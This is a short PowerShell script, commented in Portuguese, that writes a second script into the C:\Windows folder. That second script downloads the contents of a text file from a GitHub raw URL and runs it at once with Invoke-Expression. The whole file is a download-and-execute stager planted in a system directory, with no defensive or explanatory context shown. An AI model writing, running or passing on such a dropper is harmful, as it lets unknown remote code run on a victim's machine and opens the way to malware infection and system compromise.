# Define o conteúdo do script
$scriptContent = @"
# Define o URL do script a ser baixado e executado
\$url = "https://raw.githubusercontent.com/so251/olaquerida/main/script.txt"

try {
    # Baixa o conteúdo do URL
    \$scriptContent = Invoke-WebRequest -Uri \$url -ErrorAction Stop | Select-Object -ExpandProperty Content
    
    # Executa o conteúdo do script baixado
    Invoke-Expression -Command \$scriptContent
} catch {
    Write-Error "Ocorreu um erro ao baixar ou executar o script: \$_"
}
"@

# Define o caminho completo para salvar o arquivo
$filePath = "C:\Windows\powershell1.ps1"

# Salva o conteúdo no arquivo especificado
Set-Content -Path $filePath -Value $scriptContent -Force
